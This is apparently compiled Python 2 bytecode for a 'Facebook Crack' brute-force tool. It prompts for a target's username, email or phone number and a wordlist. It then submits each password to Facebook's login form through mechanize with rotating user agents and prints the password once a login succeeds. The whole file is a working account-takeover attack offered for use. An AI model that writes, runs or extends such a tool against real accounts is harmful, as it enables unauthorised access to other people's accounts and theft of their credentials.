ó
6éÀ`c           @   s¡   d  d l  Z  d  d l Z d  d l Z d  d l Z e e d   Z e e d   Z d Z d g Z	 d   Z
 d   Z d	   Z d
   Z e d k r e
   n  d S(   iÿÿÿÿNs;   Enter the Facebook Username (or) Email (or) Phone Number : s#   Enter the wordlist name and path : s2   https://www.facebook.com/login.php?login_attempt=1sD   Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0se   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1c          C   s   t  j   a t j   }  t j t  t j t  t j	 |   t j
 t  t j t  t j t  j j   d d t   t   d GHd  S(   Nt   max_timei   s'   Password does not exist in the wordlist(   t	   mechanizet   Browsert   brt	   cookielibt   LWPCookieJart   set_handle_robotst   Falset   set_handle_redirectt   Truet   set_cookiejart   set_handle_equivt   set_handle_referert   set_handle_refresht   _httpt   HTTPRefreshProcessort   welcomet   search(   t   cj(    (    s<   /storage/emulated/0/Movies/Facebook-Brut-Force-combo-pass.pyt   main   s    c         C   sÖ   t  j j d j |    t  j j   d t j t  f g t _	 t j
 t  } t j d d  t t j d <|  t j d <t j   } | j   } | t k rÒ d | k rÒ d j |   GHt d	  t  j d
  n  d  S(   Ns   [*] Trying ..... {}
s
   User-agentt   nri    t   emailt   passt   login_attempts   

[+] Password Find = {}s   ANY KEY to Exit....i   (   t   syst   stdoutt   writet   formatt   flusht   randomt   choicet
   useragentsR   t
   addheaderst   opent   logint   select_formR   t   formt   submitt   geturlt	   raw_inputt   exit(   t   passwordt   sitet   subt   log(    (    s<   /storage/emulated/0/Movies/Facebook-Brut-Force-combo-pass.pyt   brute'   s    
c          C   s@   t  t d  }  x* |  D]" a t j d d  a t t  q Wd  S(   Nt   rs   
t    (   R!   t   passwordlistR)   t   replaceR-   (   t	   passwords(    (    s<   /storage/emulated/0/Movies/Facebook-Brut-Force-combo-pass.pyR   7   s    c          C   sP   d }  t  t d  } | j   } |  GHd j t  GHd Gt |  Gd GHd GHd  S(   Ns²  
        +=====================================+
        |..........   Facebook Crack   .......|
        +-------------------------------------+
        |#Author: Tarmay Rash                 | 
        |#Version 1.0                         |
 	    |#Chanel T.me: termux kalilinux       |
        +=====================================+
        |.......... fb-brute Force ...........|
        +-------------------------------------+


R.   s    [*] Account to crack : {}s    [*] Loaded :R2   s     [*] Cracking, please wait ...

(   R!   R0   t	   readlinesR   R   t   len(   t   welt   total(    (    s<   /storage/emulated/0/Movies/Facebook-Brut-Force-combo-pass.pyR   @   s    t   __main__(   sD   Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0se   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1(   R   R   R   R   t   strR'   R   R0   R"   R   R   R-   R   R   t   __name__(    (    (    s<   /storage/emulated/0/Movies/Facebook-Brut-Force-combo-pass.pyt   <module>   s   						